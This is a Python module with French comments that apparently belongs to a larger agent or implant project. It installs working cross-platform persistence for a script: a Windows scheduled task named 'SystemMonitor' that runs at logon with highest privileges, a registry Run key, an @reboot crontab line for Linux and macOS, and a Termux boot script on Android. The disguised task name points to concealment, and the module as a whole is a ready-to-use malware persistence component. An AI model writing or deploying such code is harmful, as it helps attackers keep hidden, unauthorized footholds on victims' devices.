import os
import platform
import subprocess
import sys
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent

def is_windows() -> bool:
    return platform.system().lower() == "windows"

def is_macos() -> bool:
    return platform.system().lower() == "darwin"

def is_linux() -> bool:
    return platform.system().lower() == "linux"

def is_android() -> bool:
    return "ANDROID_ROOT" in os.environ or "android" in platform.platform().lower()

def get_persistence_command(script_path: str):
    """Génère la commande de persistance selon l'OS"""
    if is_windows():
        task_name = "SystemMonitor"
        return [
            "schtasks", "/Create",
            "/SC", "ONLOGON",
            "/TN", task_name,
            "/TR", f'"{script_path}"',
            "/RL", "HIGHEST",
            "/F"
        ]
    elif is_linux() or is_macos():
        cron_line = f"@reboot python3 {script_path}"
        return f'(crontab -l 2>/dev/null | grep -v "{script_path}"; echo "{cron_line}") | crontab -'
    else:
        return None

def add_startup(script_path=None):
    """Ajoute le script actuel au démarrage selon l'OS"""
    if script_path is None:
        script_path = os.path.abspath(sys.argv[0])

    print(f"[•] Configuration de la persistance pour : {script_path}")

    if is_windows():
        try:
            # Tâche planifiée
            cmd = get_persistence_command(script_path)
            subprocess.run(cmd, shell=True, check=True)
            print("[✓] Tâche planifiée Windows créée.")

            # Registre
            reg_key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
            script_name = Path(script_path).stem.replace(" ", "_")
            subprocess.run([
                "reg", "add", reg_key,
                "/v", script_name,
                "/t", "REG_SZ",
                "/d", script_path,
                "/f"
            ], shell=True, check=True)
            print("[✓] Clé de registre ajoutée.")
        except Exception as e:
            print(f"[!] Erreur persistance Windows : {e}")

    elif is_macos() or is_linux():
        try:
            cmd = get_persistence_command(script_path)
            subprocess.run(cmd, shell=True, executable="/bin/bash", check=True)
            print("[✓] Cron job ajouté pour macOS/Linux.")
        except Exception as e:
            print(f"[!] Erreur cron : {e}")

    elif is_android():
        try:
            print("[•] Android détecté : configuration Termux Boot")
            android_script = BASE_DIR / "agents" / "android" / "startup_persistence.sh"
            if android_script.exists():
                subprocess.run(["bash", str(android_script)], check=True)
                print("[✓] Script Termux boot activé.")
            else:
                print(f"[!] Script manquant : {android_script}")
        except Exception as e:
            print(f"[!] Erreur persistance Android : {e}")

    else:
        print("[!] OS non pris en charge pour la persistance.")

# Test CLI
if __name__ == "__main__":
    add_startup()
